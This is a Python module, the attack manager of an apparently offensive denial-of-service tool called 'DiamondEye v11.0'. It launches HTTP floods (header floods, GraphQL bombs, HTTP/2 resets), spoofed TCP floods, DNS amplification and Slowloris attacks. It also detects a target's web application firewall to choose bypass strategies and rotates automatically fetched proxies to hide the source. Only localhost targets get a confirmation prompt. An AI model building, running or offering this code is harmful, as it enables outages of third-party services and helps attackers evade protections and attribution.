# core/attack_manager.py
import asyncio
import time
import signal
import logging
from urllib.parse import urlparse
from typing import Optional, Dict, Any

from colorama import Fore, Style

from attack import HttpAttackEngine
from core.attack_config import AttackConfig
from core.resource_monitor import ResourceMonitor
from core.rate_limiter import JitteredRateLimiter, AdaptiveRateLimiter
from bypass import WAFDetector, WAFType

try:
    from layers.layer4.tcp_flood import TCPFlood
    from layers.amplification.dns_amp import DNSAmplifier
    from proxy.manager import ProxyManager
except ImportError:
    class TCPFlood: pass
    class DNSAmplifier: pass
    class ProxyManager: pass

logger = logging.getLogger(__name__)


class AttackManager:
    
    def __init__(self, args):
        self.args = args
        self.active_attack = None
        self.proxy_manager = None
        self.resource_monitor = None
        self.start_time = time.time()
        self._running = False
        self._shutdown_event = asyncio.Event()
        self._monitor_task = None
        self._detected_waf: Optional[WAFType] = None
        
        self.stats = {
            'packets_sent': 0,
            'bytes_sent': 0,
            'errors': 0,
            'rps_history': [],
            'bandwidth_history': []
        }
    
    async def initialize(self) -> bool:
        logger.info("Initializing DiamondEye v11.0...")
        
        if self.args.proxy_auto or self.args.proxy_file:
            self.proxy_manager = ProxyManager()
            await self._setup_proxies()
        
        alert_threshold = getattr(self.args, 'resource_alert', 90)
        self.resource_monitor = ResourceMonitor(alert_threshold=alert_threshold)
        
        if getattr(self.args, 'auto_bypass', False) and self.args.url:
            await self._auto_detect_and_adapt()
        
        return True
    
    async def _auto_detect_and_adapt(self):
        logger.info("Running auto-detection for target protection...")
        
        url = self.args.url
        
        try:
            import aiohttp
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    url,
                    timeout=10,
                    allow_redirects=True,
                    ssl=False
                ) as resp:
                    headers = dict(resp.headers)
                    self._detected_waf = WAFDetector.detect(headers)
                    
                    if self._detected_waf != WAFType.UNKNOWN:
                        print(f"{Fore.GREEN}✅ Detected protection: {self._detected_waf.value.upper()}{Style.RESET_ALL}")
                        
                        strategy = WAFDetector.get_bypass_strategy(self._detected_waf)
                        
                        if strategy.get('requires_ja3_spoof'):
                            logger.info("JA3 spoofing not available in this version")
                    else:
                        print(f"{Fore.YELLOW}⚠️ No specific protection detected{Style.RESET_ALL}")
                        
        except Exception as e:
            logger.debug(f"Auto-detection failed: {e}")
    
    async def _setup_proxies(self):
        try:
            if self.args.proxy_file:
                await self.proxy_manager.load_from_file(self.args.proxy_file)
            elif self.args.proxy_auto:
                await self.proxy_manager.fetch_proxies()
        except Exception as e:
            logger.error(f"Failed to setup proxies: {e}")
            return
        
        if self.proxy_manager and self.proxy_manager.proxies:
            await self.proxy_manager.check_all(concurrency=50, timeout=self.args.proxy_timeout)
            await self.proxy_manager.start_background_check()
            self.proxy_manager.print_stats()
    
    async def start_attack(self):
        logger.info(f"Starting {self.args.attack_type.upper()} attack")
        
        self._running = True
        self._shutdown_event.clear()
        
        loop = asyncio.get_running_loop()
        for sig in (signal.SIGINT, signal.SIGTERM):
            try:
                loop.add_signal_handler(sig, lambda: asyncio.create_task(self.stop_attack()))
            except NotImplementedError:
                pass
        
        if self.resource_monitor:
            self._monitor_task = asyncio.create_task(
                self.resource_monitor.monitor(interval=getattr(self.args, 'monitor_interval', 1.0))
            )
        
        try:
            if self.args.attack_type == 'tcp':
                await self._start_tcp_attack()
            elif self.args.attack_type == 'dns':
                await self._start_dns_amplification()
            elif self.args.attack_type == 'slowloris':
                await self._start_slowloris_attack()
            else:
                await self._start_http_attack()
                
        except asyncio.CancelledError:
            logger.info("Attack cancelled")
        except Exception as e:
            logger.error(f"Attack error: {e}", exc_info=self.args.debug)
        finally:
            await self.stop_attack()
            if self._monitor_task:
                self._monitor_task.cancel()
    
    async def _start_http_attack(self):
        if self.args.url:
            parsed = urlparse(self.args.url)
            hostname = parsed.hostname.lower() if parsed.hostname else ""
            
            if hostname in ('localhost', '127.0.0.1', '0.0.0.0') or hostname.startswith('127.'):
                logger.warning(f"{Fore.YELLOW}⚠️ Target is localhost!{Style.RESET_ALL}")
                if not getattr(self.args, 'confirm_local', False):
                    response = input(f"{Fore.YELLOW}Type 'I UNDERSTAND' to continue: {Style.RESET_ALL}")
                    if response.strip().upper() != 'I UNDERSTAND':
                        return
        
        proxy = self.args.proxy
        if self.proxy_manager and self.proxy_manager.proxies:
            proxy = self.proxy_manager.get_next_proxy()
            if proxy:
                logger.info(f"Using proxy: {proxy}")
        
        config = AttackConfig(
            url=self.args.url,
            workers=self.args.workers,
            sockets_per_worker=self.args.sockets,
            pipeline_depth=getattr(self.args, 'pipeline', 1),
            duration=self.args.duration,
            methods=self.args.methods,
            method_fuzz=self.args.method_fuzz,
            data_size=self.args.data_size,
            path_fuzz=self.args.path_fuzz,
            useragents=self.args.useragents or [],
            auth_token=self.args.auth,
            junk_headers=self.args.junk,
            header_flood=self.args.header_flood,
            random_host=self.args.random_host,
            randomize_header_order=True,
            waf_type=self._detected_waf.value if self._detected_waf else None,
            auto_bypass=getattr(self.args, 'auto_bypass', False),
            proxy=proxy,
            no_ssl_check=self.args.no_ssl_check,
            use_http2=self.args.http2,
            use_http3=self.args.http3,
            websocket=self.args.websocket,
            graphql_bomb=self.args.graphql_bomb,
            h2reset=self.args.h2reset,
            slow_rate=getattr(self.args, 'slow', 0.0),
            extreme=self.args.extreme,
            flood=self.args.flood,
            max_rps=self.args.max_rps,
            max_bandwidth_mbps=self.args.max_bandwidth,
            jitter_percent=getattr(self.args, 'jitter', 10.0),
            slow_connections=getattr(self.args, 'slow_connections', 1000),
            connection_timeout=5.0,
            read_timeout=10.0,
            keepalive_timeout=5.0 if not self.args.extreme else 0.1,
            debug=self.args.debug,
        )
        
        attack = HttpAttackEngine(config)
        self.active_attack = attack
        
        if self.args.duration > 0:
            asyncio.create_task(self._duration_timer())
        
        await attack.start()
    
    async def _start_tcp_attack(self):
        from layers.layer4.tcp_flood import TCPFlood
        flood = TCPFlood(
            target_ip=self.args.target_ip,
            target_port=self.args.target_port,
            workers=self.args.workers * 2,
            spoof_ip=self.args.spoof_ip,
            packet_size=getattr(self.args, 'packet_size', 1024)
        )
        self.active_attack = flood
        await flood.start()
    
    async def _start_dns_amplification(self):
        from layers.amplification.dns_amp import DNSAmplifier
        amplifier = DNSAmplifier(
            target_ip=self.args.target_ip,
            amplification_factor=50,
            workers=self.args.workers
        )
        self.active_attack = amplifier
        await amplifier.start()
    
    async def _start_slowloris_attack(self):
        from plugins.slowloris_plugin import SlowlorisPlugin
        target = self.args.target_ip or self.args.url
        if not target:
            raise ValueError("No target specified")
        
        if '://' in target:
            parsed = urlparse(target)
            host = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        else:
            host = target
            port = self.args.target_port or 80
        
        plugin = SlowlorisPlugin()
        await plugin.initialize({
            'host': host,
            'port': port,
            'max_connections': self.args.workers * 50,
            'timeout': getattr(self.args, 'timeout', 10)
        })
        
        self.active_attack = plugin
        await plugin.execute(f"{host}:{port}", duration=self.args.duration)
    
    async def _duration_timer(self):
        await asyncio.sleep(self.args.duration)
        if self._running:
            logger.info(f"Duration {self.args.duration}s reached, stopping")
            await self.stop_attack()
    
    async def stop_attack(self):
        if not self._running:
            return
            
        logger.info("Stopping attack...")
        self._running = False
        self._shutdown_event.set()
        
        if self.active_attack:
            if hasattr(self.active_attack, 'stop'):
                self.active_attack.stop()
            elif hasattr(self.active_attack, 'shutdown'):
                await self.active_attack.shutdown()
            elif hasattr(self.active_attack, 'cleanup'):
                await self.active_attack.cleanup()
        
        if self.proxy_manager:
            await self.proxy_manager.stop_background_check()
        
        if self.resource_monitor:
            self.resource_monitor.stop()
        
        await self._generate_report()
        logger.info("Attack stopped")
    
    async def _generate_report(self):
        duration = time.time() - self.start_time
        
        if self.active_attack and hasattr(self.active_attack, 'sent'):
            self.stats['packets_sent'] = getattr(self.active_attack, 'sent', 0)
            self.stats['errors'] = getattr(self.active_attack, 'failed', 0)
            if hasattr(self.active_attack, 'rps_history'):
                self.stats['rps_history'] = self.active_attack.rps_history
        
        report = {
            'attack_type': self.args.attack_type,
            'duration': duration,
            'stats': self.stats,
            'detected_waf': self._detected_waf.value if self._detected_waf else None,
            'config': {
                'workers': self.args.workers,
                'target': self.args.target_ip or self.args.url,
                'timestamp': time.time()
            }
        }
        
        if self.args.log:
            self._save_text_report(report)
        if self.args.json:
            self._save_json_report(report)
    
    def _save_text_report(self, report):
        try:
            with open(self.args.log, 'w', encoding='utf-8') as f:
                f.write(f"DiamondEye v11.0 - Attack Report\n")
                f.write(f"{'='*50}\n")
                f.write(f"Attack Type: {report['attack_type']}\n")
                f.write(f"Duration: {report['duration']:.2f}s\n")
                f.write(f"Packets Sent: {report['stats'].get('packets_sent', 0)}\n")
                f.write(f"Errors: {report['stats'].get('errors', 0)}\n")
                if report.get('detected_waf'):
                    f.write(f"Detected WAF: {report['detected_waf']}\n")
            logger.info(f"Text report saved to {self.args.log}")
        except Exception as e:
            logger.error(f"Failed to save report: {e}")
    
    def _save_json_report(self, report):
        import json
        try:
            with open(self.args.json, 'w', encoding='utf-8') as f:
                json.dump(report, f, indent=2, ensure_ascii=False, default=str)
            logger.info(f"JSON report saved to {self.args.json}")
        except Exception as e:
            logger.error(f"Failed to save JSON: {e}")